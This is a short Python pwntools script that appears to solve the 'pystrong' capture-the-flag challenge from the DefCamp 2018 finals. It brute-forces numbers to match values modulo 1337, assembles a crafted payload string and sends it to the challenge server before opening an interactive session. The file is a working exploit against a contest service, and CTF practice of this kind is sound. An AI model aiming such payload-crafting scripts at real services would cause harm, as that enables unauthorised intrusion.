from pwn import *
context.log_level = 'DEBUG'

PRIV = 1198041294
tests = [float(559), float(661), float(661), float(522)]
payload = [1, 12, 31, 0, 0, 1337]

for test in tests:
    i = 1
    while True:
        if i*PRIV % int(payload[5]) == test:
            payload.append(i)
            break;
        i = i + 1

payload[6] = 1919247222
payload.append('a=PRIV')

payload = ' '.join([str(x) for x in payload])
# exit()

# p = remote('127.0.0.1', 13022)
p = remote('pystrong.dctf18-finals.def.camp', 13022)
p.sendline(payload)
p.interactive()

